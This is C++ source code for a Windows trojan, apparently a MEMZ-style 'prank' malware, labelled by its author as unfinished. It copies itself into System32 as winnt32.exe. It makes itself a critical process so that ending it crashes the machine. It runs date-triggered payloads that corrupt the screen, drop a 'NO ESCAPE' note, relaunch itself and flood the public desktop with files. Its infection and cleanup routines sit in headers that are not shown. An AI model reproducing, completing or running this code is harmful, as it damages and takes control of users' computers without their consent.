#include "main.h" //main thing of the malware body won't run without it
#define UNICODE
//todo : implement hooks and add base file for run NOTE: Body not complete yet
using namespace std;
EXTERN_C IMAGE_DOS_HEADER __ImageBase;
#define _CRT_SECURE_NO_WARNINGS
#pragma warning(suppress : 4996)
#include <iostream>
#include <fstream>
#include <string>
#include <direct.h>
#include <Windows.h>
#include <stdio.h>
#include "sometestpayloads.h" //Leurak! YO VINEMEMZ
#include <CommCtrl.h>
#include <winternl.h>
#include <iostream> 
#include <tlhelp32.h> 
#include <tchar.h> 
#include "userimages.h" //contains all the images hex thingy
#pragma comment(lib,"ntdll.lib")
#include "definitions.h" //contains all the functions
void all();
void taskmgr();
void lua();
int WINAPI WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nCmdShow) {
    //unconditional file check
    //if malware body exists then skip this message if not start the infection process
	//anyone can actually abuse this so might fix this after sometime
	//100% best code organisation
    FILE* file;
	if (file = fopen("C:\\Windows\\System32\\winnt32.exe", "r")) {
        fclose(file);
		infect();
		SYSTEMTIME time;
		GetSystemTime(&time);
		if (time.wMonth == 1 && time.wDay == 1) {
			Sleep(20000);
			while (1) {
				HDC hdc = GetDC(HWND_DESKTOP);
				int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
				BitBlt(hdc, rand() % 5, rand() % 5, rand() % sw, rand() % sh, hdc, rand() % 5, rand() % 5, SRCCOPY);
				ReleaseDC(0, hdc);
			}
		}
		if (time.wMonth == 12 && time.wDay == 24) {
			Sleep(20000);
			if (file = fopen("C:\\Windows\\System32\\noescapeexe.txt", "r")) {
				fclose(file);
				ExitProcess(0);
			}
			else {
				RtlAdjustPrivilege(20, TRUE, FALSE, &bl);
				BreakOnTermination = 1;
				clean();
				HANDLE note = CreateFileA("C:\\Windows\\System32\\noescapeexe.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

				if (note == INVALID_HANDLE_VALUE)
					ExitProcess(4);
				DWORD wb;
				if (!WriteFile(note, msg, msg_len, &wb, NULL))
					ExitProcess(5);

				CloseHandle(note);
				//BreakOnTermination = 0;

				//status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));
				status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));
				MessageBoxA(NULL, "You just GOT PRANKED", "YOU JUST GOT PRANKED!", MB_ICONHAND);
				ShellExecuteA(NULL, NULL, "notepad.exe", NULL, NULL, SW_SHOW);
				//HANDLE thread = CreateThread(NULL, 0, &WatchdogThread, NULL, 0, NULL);
				Sleep(2000);
				lol();
				HANDLE thread = CreateThread(NULL, 0, &bonziWatchdogThread, NULL, 0, NULL);
				Sleep(2000);
				//CreateThread(NULL, 0, Checkykey, NULL, 0, NULL);
				CreateThread(NULL, 0, Checknkey, NULL, 0, NULL);
				while (1) {
					if (GetKeyState('Y') & 0x8000) {
						TerminateThread(thread, 0);
						CloseHandle(thread);
						execute();
						infect();
						MSG msg;
						BOOL bRet;
						HWND hwndMain;
						WNDCLASSEX wcx;

						(void)hPrevInstance;
						(void)lpCmdLine;
						(void)nCmdShow;


						wcx.cbSize = sizeof(wcx);
						wcx.style = CS_HREDRAW | CS_VREDRAW;
						wcx.lpfnWndProc = WindowProc;
						wcx.cbClsExtra = 0;
						wcx.cbWndExtra = 0;
						wcx.hInstance = hInstance;
						wcx.hIcon = LoadIcon(NULL, IDI_APPLICATION);
						wcx.hCursor = LoadCursor(NULL, IDC_ARROW);
						wcx.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);

						wcx.lpszMenuName = L"MainMenu";
						wcx.lpszClassName = L"MainWndClass";
						wcx.hIconSm = (HICON)LoadImage(hInstance,
							MAKEINTRESOURCE(5),
							IMAGE_ICON,
							GetSystemMetrics(SM_CXSMICON),
							GetSystemMetrics(SM_CYSMICON),
							LR_DEFAULTCOLOR);

						if (!RegisterClassEx(&wcx))
							return FALSE;

						hwndMain = CreateWindowA("MainWndClass", "No Windows Button",
							WS_ICONIC | WS_BORDER | WS_CAPTION | WS_MINIMIZEBOX | WS_SYSMENU,
							CW_USEDEFAULT,
							CW_USEDEFAULT,
							400,
							80,
							(HWND)NULL,
							(HMENU)NULL,
							hInstance,
							(LPVOID)NULL);

						if (!hwndMain)
							return FALSE;

						AnimateWindow(hwndMain, 1000, AW_HIDE | AW_BLEND);

						UpdateWindow(hwndMain);

						while ((bRet = GetMessage(&msg, NULL, 0, 0)) != 0)
						{
							if (bRet == -1)
							{
								// handle the error and possibly exit
							}
							else
							{
								TranslateMessage(&msg);
								DispatchMessage(&msg);
							}
						}

						return msg.wParam;
					}
				}
			}		
		}
		if (time.wMonth == 3 && time.wDay == 13) {

			RtlAdjustPrivilege(20, TRUE, FALSE, &bl);
			BreakOnTermination = 1;

			status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));
			Sleep(10000);
			move();
			for (int i = 0; i < 2; i++) {
				ShellExecute(NULL, NULL, L"C:\\Windows\\System32\\winnt32.exe", NULL, NULL, SW_SHOW);
			}
		}
		if (time.wMonth == 5 && time.wDay == 4) {
			RtlAdjustPrivilege(20, TRUE, FALSE, &bl);
			BreakOnTermination = 1;

			status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));
			dark();
			Sleep(10000);
			for (int i = 0; i < 3; i++) {
				ShellExecute(NULL, NULL, L"C:\\Windows\\System32\\winnt32.exe", NULL, NULL, SW_SHOW);
			}
		}
		if (time.wMonth == 1 && time.wDay == 5) {
			MessageBoxA(NULL, "Fred Durst Says: No computer today silly boy go outsie to play", "New Message(1) From Fred Durst", MB_ICONEXCLAMATION);
		}
		RtlAdjustPrivilege(20, TRUE, FALSE, &bl);
		BreakOnTermination = 1;

		status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));
		while (true) {

		}
	}
	else{
		if (MessageBoxA(NULL, "This malware is no joke continue?", "WINNT32.EXE", MB_YESNO | MB_ICONQUESTION) == IDYES)
		{
			extractall();
			//takeown /f "C:\ProgramData\Microsoft\User Account Pictures" /r /d y
			char system[MAX_PATH];
			char pathtofile[MAX_PATH];
			HMODULE GetModH = GetModuleHandleA(NULL);
			GetModuleFileNameA(GetModH, pathtofile, sizeof(pathtofile));
			GetSystemDirectoryA(system, sizeof(system));
			strcat(system, "\\winnt32.exe");
			CopyFileA(pathtofile, system, false);
			std::size_t l = 0;                                                            // starts a counting number this will help this program to create separate files
			const char* path = "C:\\Users\\Public\\Desktop\\";                                                      // location in which all files are going to stored
			std::string content = "Your Computer is mine you can't get rid of this malware - NO ESCAPE";                 // the content of our files                                                                      // creates a folder in c: drive in which files are going to written in and saved
			for (int i = 0; i < 150; i++)// an infinite loop
			{
				l++;                                                                               // adds i to itself every time
				std::ofstream file;                                                                // creates a constructor this will save our file
				file.open(path + std::to_string(l) + ".txt", std::ios_base::out);                  // creates a file to a location
				file << content;                                                                   // writes the content in the file and then saves it
				file.close();                                                                      // closes the file // if you want to take more resources don't write this line                 // gives us an accurate number of files created inside a directory
			}
			all();
		}
		else
		{
			return 0;
		}
    }
}
